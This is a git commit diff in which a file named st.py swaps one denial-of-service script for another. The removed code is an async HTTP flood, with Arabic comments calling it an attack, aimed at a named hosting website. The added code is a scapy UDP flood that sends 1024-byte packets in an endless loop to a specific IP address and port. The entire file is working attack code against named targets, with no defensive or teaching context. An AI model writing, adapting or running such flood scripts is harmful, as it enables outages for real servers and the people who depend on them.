f4d50fe33f982362c5199d3b3ccc73fea8a55fbe
MAGIC HOSTING <112265944+HiloDevnn@users.noreply.github.com>
2024-04-14 23:46:03 +0100

    Update st.py

--- st.py
+++ st.py
@@ -1,24 +1,11 @@
-import asyncio
-import aiohttp
+from scapy.all import *
 
-target_url = "https://mena-hosting.net/"  # قم بتعديلها لتكون عنوان الموقع المستهدف
-num_requests = 10000  # عدد الطلبات التي ستتم إرسالها
-concurrency = 1000  # عدد الاتصالات المتزامنة
+target_ip = "164.92.234.227"
+target_port = 7777
 
-async def send_requests(session):
-    tasks = []
-    for _ in range(num_requests):
-        task = asyncio.ensure_future(session.get(target_url))
-        tasks.append(task)
-        if len(tasks) >= concurrency:
-            await asyncio.gather(*tasks)
-            tasks = []
-    await asyncio.gather(*tasks)
+def udp_flood(target_ip, target_port):
+    while True:
+        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="A"*1024)
+        send(packet, verbose=0)
 
-async def main():
-    async with aiohttp.ClientSession() as session:
-        await send_requests(session)
-
-loop = asyncio.get_event_loop()
-loop.run_until_complete(main())
-print("تم إرسال الهجوم بنجاح!")
+udp_flood(target_ip, target_port)
